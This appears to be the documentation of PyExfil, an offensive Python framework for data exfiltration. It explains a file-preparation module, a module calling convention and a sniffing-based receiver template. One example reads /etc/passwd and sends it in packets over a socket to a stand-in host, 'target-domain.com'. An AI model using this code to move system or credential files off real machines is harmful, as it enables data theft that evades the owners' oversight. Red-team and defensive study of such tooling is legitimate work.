# Documentation | PyExfil

PyExfil aims to provide a versatile yet straightforward framework for data exfiltration using various methods while striving for minimal dependencies. This documentation outlines the core functionalities, shared modules, and proper usage guidelines to facilitate both contributions to the project and its ethical use.


## Introduction
PyExfil is designed with modularity and ease of use in mind, focusing on standalone modules to support a wide range of exfiltration techniques. By maintaining minimal dependencies, PyExfil ensures compatibility across different environments and ease of conversion to static binaries for multiple operating systems.


### Shared Abilities
Central to PyExfil is the ability to prepare data for exfiltration efficiently. This functionality is encapsulated in the `pyexfil/includes/prepare` module, which offers methods for file compression, encryption, encoding, and splitting into manageable packets.

Please notice that although we have tried to keep this a collection of relatively separated stand alone modules so that converting them to static binaries for various operating systems would be as easy as possible, some things we have decided to turn into modules that would be shared across the board while attempting to keep is as depency free as possible. Such a component for now is `pyexfil/includes/prepare`. This module contains the methods of converting files (compressing, encrypting, encoding and splitting) into chunks ready to be sent or decoded.

You can use it in the following way:

```python
import socket
from pyexfil.includes.prepare import PrepFile, RebuildFile, DecodePacket

# Preparing the file
proc = PrepFile('/etc/passwd', kind='binary')  # Yields a dictionary of packets

# Initiating socket connection and sending data
sock = socket.socket()
sock.connect(('target-domain.com', 443))  # Replace with your actual target
for packet in proc['Packets']:
    sock.send(packet)
sock.close()

# Rebuilding the data from packets
conjoint = [DecodePacket(packet) for packet in proc['Packets']]

# Verify and rebuild the file
print(RebuildFile(conjoint))
```
**Note**: Ensure the use of secure and legal endpoints for data exfiltration. The example provided is for educational purposes only.


### Calling Convention
To facilitate ease of use and consistency across modules, PyExfil adopts a standardized calling convention:

In theory we wish each module to have a convention call to make it easier to work with. Some methods make it easier while some make it more difficult. For that, here is a template on how we wish for it to be. Please bear in mind some modules will not fall into place. Use your best judgment.

1. Preparing file/data for exfiltration should be done as in [this section]("#shared-abilities").
2. Place the package folder under the right location. For example; short communication (C&C) under `Comm`, exfiltration over network communication under `network` etc.
3. Create an `__init__.py` under that folder.
4. For broadcasting purposes use the function name `Send` that will wrap everything up.
5. For receiving purposes use `Broker` function to contain the function. If possible, set it up in a threading mode as to return back.
6. * if possible add a call back function for when data arrives.

Here's an `__ini__.py` example file:

```python
from scapy.all import sniff
from pyexfil.includes.prepare import PrepFile

def _send_packet(host, port, data, counter):
    # Efficient way to handle string formatting and file operations
    with open('/dev/null', 'w') as f:
        f.write(f"{data}{counter}")

def _testCallBack(pkt):
    # Example callback function for packet reception
    print(f"Received a packet! Length: {len(pkt)}")

def Send(fname, password, host, port):
    # Example function to prepare and send data
    proc = PrepFile(fname, kind='binary', enc_key=password, max_size=1024)
    for i, p in enumerate(proc['Packets']):
        _send_packet(host, port, p, i)
    return True

class Broker:
    def __init__(self, key, retFunc=_testCallBack):
        self.key = key
        self.callBack = retFunc

    def _parse(self, pkt):
        # Replace with actual packet validation and processing logic
        if pkt == 'A Good Boy':
            self.callBack(pkt)
        else:
            pass

    def Listen(self):
        # Adjust filter according to the specific use case
        sniff(prn=self._parse, filter='ip', store=0)
```

There are also a few "ready made functions" that we found useful on several scenarios that can be found in the `general.py`, `image_manipulation.py` and `encryption_wrappers.py`. Have a look at them before reimplementing some of these.

### Additional Resources
PyExfil includes several ready-made functions found in `general.py`, `image_manipulation.py`, and `encryption_wrappers.py`. These are intended to simplify common tasks and should be reviewed before developing new functionalities.

### Exceptions

`PyExfil` holds ability to raise custom exceptions. These exceptions appear in `pyexfil/includes/exceptions.py`

## Security Considerations
Given the sensitive nature of data exfiltration, users are urged to adhere to strict security practices, including secure key management and the use of robust encryption. Always ensure ethical use under applicable laws and regulations.

## Contributions
Contributions to PyExfil are welcome. Please follow the project's contribution guidelines to ensure a smooth collaboration process.

# Legal and Ethical Use
PyExfil is provided for educational and research purposes. Users must ensure all activities conducted with PyExfil comply with applicable laws and ethical guidelines. The developers disclaim any liability for misuse or illegal activities.



